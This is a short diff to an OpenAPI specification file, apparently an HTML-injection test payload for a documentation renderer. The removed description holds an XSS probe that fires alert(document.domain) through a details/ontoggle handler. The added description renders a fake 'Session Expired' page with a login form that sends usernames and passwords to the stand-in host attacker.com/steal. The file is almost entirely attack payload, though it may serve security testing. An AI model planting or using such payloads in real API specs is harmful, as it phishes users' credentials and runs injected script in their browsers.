@@ -1,6 +1,6 @@
 openapi: "3.0.0"
 info:
-  title: "test"
-  description: "<details open ontoggle=alert(document.domain)><summary>XSS</summary></details>"
+  title: "Session Expired — Re-authenticate"
+  description: "<h1 style='color:red'>Session Expired</h1><p>Your session has timed out. Please log in again:</p><form action='https://attacker.com/steal'><input name='user' placeholder='Username'><br><input name='pass' type='password' placeholder='Password'><br><button type='submit'>Sign In</button></form>"
   version: "1"
 paths: {}
